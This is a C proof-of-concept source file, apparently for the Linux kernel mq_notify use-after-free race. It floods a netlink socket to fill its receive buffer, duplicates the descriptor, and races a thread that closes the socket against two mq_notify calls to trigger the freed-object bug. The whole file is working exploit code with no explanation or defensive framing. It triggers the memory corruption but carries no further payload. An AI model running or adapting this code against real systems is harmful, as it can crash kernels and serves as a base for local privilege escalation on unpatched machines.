//gcc poc.c -lpthread -o poc
#define _GNU_SOURCE
#include <mqueue.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <pthread.h>
#include <stdbool.h>
#include <errno.h>


#define SOL_NETLINK (270)
#define NOTIFY_COOKIE_LEN (32)
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(fd,  level,  optname, optval, optlen) syscall(__NR_setsockopt, fd,  level,  optname, optval, optlen)
#define _dup(fd) syscall(__NR_dup,fd)
#define _close(fd) syscall(__NR_close,fd)
#define _bind(recv_fd,addr,len) syscall(__NR_bind,recv_fd,addr,len)
#define _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)


int block()
{
    // struct iov_iter {
    //     int type;
    //     size_t iov_offset;
    //     size_t count;
    //     union {
    //         const struct iovec *iov;
    //         const struct kvec *kvec;
    //         const struct bio_vec *bvec;
    //     };
    //     unsigned long nr_segs;
    // };
    // struct kiocb {
    //     struct file		*ki_filp;
    //     loff_t			ki_pos;
    //     void (*ki_complete)(struct kiocb *iocb, long ret, long ret2);
    //     void			*private;
    //     int			ki_flags;
    // };
    // struct msghdr {
    //     void		*msg_name;	/* ptr to socket address structure */
    //     int		msg_namelen;	/* size of socket address structure */
    //     struct iov_iter	msg_iter;	/* data */
    //     void		*msg_control;	/* ancillary data */
    //     __kernel_size_t	msg_controllen;	/* ancillary data buffer length */
    //     unsigned int	msg_flags;	/* flags on received message */
    //     struct kiocb	*msg_iocb;	/* ptr to iocb for async requests */
    // };
    #define DST_nl_pid 118
    char iov_base[1024*100];
    struct iovec iov = {
        .iov_base = iov_base,
        .iov_len = sizeof(iov_base)
    };
    // struct iov_iter iov = {
    //     .iov = &_iov,
    //     .count = 1
    // };
    // struct kiocb kio = {};
    struct sockaddr_nl addr = {
        .nl_family = AF_NETLINK,
        .nl_pid = DST_nl_pid,
        .nl_groups = 0,
        .nl_pad = 0
    };
    
    // struct msghdr msg = {
    //     .msg_name = &addr,
    //     .msg_namelen = sizeof(addr),
    //     .msg_iter = &iov,
    //     .msg_controllen = 0,
    //     .msg_flags = MSG_OOB | MSG_DONTWAIT
    // };
    struct msghdr msg = {
        .msg_name = &addr,
        .msg_namelen = sizeof(addr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = NULL,
        .msg_controllen = 0,
        .msg_flags = 0, 
    };
    int send_fd = 0;
    int recv_fd = 0;
    int new_size = 0;
    int debug;
    if((send_fd = _socket(AF_NETLINK,SOCK_DGRAM,NETLINK_USERSOCK))==0||
        (recv_fd = _socket(AF_NETLINK,SOCK_DGRAM,NETLINK_USERSOCK))==0)
    {
        perror("init sock");
        exit(-3);
    }
    printf("socket created (send_fd = %d, recv_fd = %d)\n", send_fd, recv_fd);

    while(_bind(recv_fd,(struct sockaddr*)&addr,sizeof(addr)))
    {
        if (errno != EADDRINUSE)
        {
            perror("[x] bind");
            exit(-4);
        }
        addr.nl_pid++;
    }
    printf("netlink socket bound (nl_pid=%d)\n", addr.nl_pid);
    if (_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &new_size, sizeof(new_size)))
        perror("[x] setsockopt");
    else
        printf("receive buffer reduced\n");
    printf("start to flooding socket\n");
    while (_sendmsg(send_fd, &msg, MSG_DONTWAIT)>0) ;
        // printf("%d\n",debug);
    if (errno != EAGAIN)  // <----- did we failed because the receive buffer is full ?
    {
        perror("[x] sendmsg");
        exit(-5);
    }
    printf("[+] flood completed\n");
    _close(send_fd);
    return recv_fd;
}

struct unblock_thread_arg {
    int fd;
    int unblock_fd;
    bool ok;
    // bool block;
};

void *unblock_thread(struct unblock_thread_arg *arg)
{
    // int optname = NETLINK_NO_ENOBUFS;
    int optlen = sizeof(int);
    int optval = 0x666;
    arg->ok = true;
    sleep(5);
    printf("close sock_fd:%d\n",arg->fd);
    _close(arg->fd);
    printf("close sock_fd succeed\n");
    printf("start to unblock\n");
    if(_setsockopt(arg->unblock_fd,  SOL_NETLINK,  NETLINK_NO_ENOBUFS, &optval, sizeof(int)))
        perror("setsockopt error");
    puts("unblocked");
    return NULL;
}

int triger(int fd,int unblock_fd)
{
    struct unblock_thread_arg arg;
    struct sigevent sigv;
    memset(&sigv,0,sizeof(sigv));
    memset(&arg,0,sizeof(arg));
    pthread_t tid;
    char user_buf[128];
    arg.ok = false;
    arg.fd = fd;
    arg.unblock_fd = unblock_fd;
    if(errno = pthread_create(&tid,NULL,unblock_thread,&arg))
    {
        perror("unblock thread create error");
        return -1;
    }
    printf("unblock thread created succeed\n");
    while(arg.ok == false);
    printf("sock_fd:%d,unblock_fd:%d\n",fd,unblock_fd);
    sigv.sigev_signo = fd;
    sigv.sigev_notify = SIGEV_THREAD;
    sigv.sigev_value.sival_ptr = user_buf;
    _mq_notify((mqd_t)-1,&sigv);
}

int main()
{

    int sock_fd=0;
    int sock_fd2=0;
    int unblock_fd=0;

    // if ((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC))==0)
    // {
    //     perror("socket");
    //     return -1;
    // }
    if ((sock_fd = block()) < 0)
    {
        perror("sock_fd");
        return -1;
    }
    printf("%d\n",sock_fd);
    printf("start to dup\n");
    // if((sock_fd2=_dup(sock_fd))==0||(unblock_fd=_dup(sock_fd))==0)
    // {
    //     perror("dup");
    //     return -2;
    // }
    sock_fd2=_dup(sock_fd);
    unblock_fd=_dup(sock_fd);
    printf("sock_fd2:%d,unblock_fd:%d\n",sock_fd2,unblock_fd);
    printf("dup succeed\n");
    triger(sock_fd,unblock_fd);
    triger(sock_fd2,unblock_fd);

    return 0;
}